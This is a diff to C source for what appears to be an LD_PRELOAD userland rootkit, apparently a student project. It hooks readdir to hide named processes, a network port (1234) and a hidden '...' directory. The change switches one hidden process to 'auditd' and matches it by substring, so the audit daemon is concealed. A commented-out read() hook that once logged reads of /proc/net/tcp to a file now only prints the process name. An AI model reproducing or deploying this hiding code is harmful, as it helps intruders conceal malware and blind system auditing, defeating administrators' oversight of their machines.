@@ -10,7 +10,7 @@
  * Every process with this name will be excluded
  */
 static const char* process_to_filter = "agente.py";
-static const char* process_to_filter2 = "novata";
+static const char* process_to_filter2 = "auditd";
 static const char* process_to_filter3 = "mala";
 
 /*
@@ -21,9 +21,10 @@ static const char* port_to_filter = ":04D2";
 
 /*
  * /Proc/self
+ */
  
-static const char* proc_self = "/proc/self";
-*/
+/*static const char* proc_self = "/proc/self";*/
+
 
 /*
  * Get a directory name given a DIR* handle
@@ -117,7 +118,7 @@ struct dirent* readdir(DIR *dirp)                                       \
                     strcmp(process_name, process_to_filter) == 0) ||    \
                 (strcmp(dir_name, "/etc/dpkg/origins") == 0 &&          \
                     strcmp(dir->d_name, "...")==0) ||                   \
-                (strcmp(process_name, process_to_filter2) == 0) ||      \
+                (strstr(process_name, process_to_filter2) != NULL) ||      \
                 (strcmp(process_name, process_to_filter3) == 0))){      \
                 continue;                                               \
             }                                                           \
@@ -131,8 +132,8 @@ DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 
 
-
-/*static int get_process_pid(char* buf, size_t size)
+/*
+static int get_process_pid(char* buf, size_t size)
 {
 
     ssize_t ret = readlink(proc_self, buf, size);
@@ -142,10 +143,10 @@ DECLARE_READDIR(dirent, readdir);
     buf[ret] = 0;
     return 1;
 
-}*/
+}
 
 
-/*static int get_file_name(int fd, char* buf, size_t size)
+static int get_file_name(int fd, char* buf, size_t size)
 {
     if(fd == -1) {
         return 0;
@@ -160,9 +161,10 @@ DECLARE_READDIR(dirent, readdir);
 
     buf[ret] = 0;
     return 1;
-}*/
-
-/*static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
+}
+*/
+/*
+static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
 
 ssize_t read (int fd, void *buf, size_t count){
 
@@ -174,26 +176,25 @@ ssize_t read (int fd, void *buf, size_t count){
         }                                                               
     } 
 
-    *****poner aqui el filtro*****
     char pid_string[256];
     char filename[256];
     char tmp[256];
-    char line[150];
+    char line[256];
 
     get_process_pid(pid_string, sizeof(pid_string));
     get_file_name(fd, filename, sizeof(filename));
 
     snprintf(tmp, sizeof(tmp), "/proc/%s/net/tcp", pid_string);
 
-    if(strcmp(tmp, filename) == 0){
-        FILE* fp = fopen("/home/tfg/Escritorio/adios.txt", "a");
+    get_process_name(pid_string, line);
 
-        fwrite( (char*)buf, count, 1, fp);
-
-        fclose(fp);
+    
+    if(strcmp(tmp, filename) == 0){ 
+        printf("Process name = %s\n", line);
     }
 
 
 
     return original_read(fd, buf, count);
-}*/
+}
+*/
